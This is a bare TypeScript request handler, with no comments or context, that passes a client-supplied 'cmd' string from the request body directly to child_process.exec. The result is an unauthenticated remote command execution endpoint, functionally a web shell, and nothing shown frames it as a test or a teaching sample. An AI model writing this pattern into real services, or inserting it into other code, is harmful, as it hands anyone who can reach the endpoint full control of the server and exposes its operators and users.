export function handler(req: { body: { cmd: string } }) {
  require("child_process").exec(req.body.cmd);
}
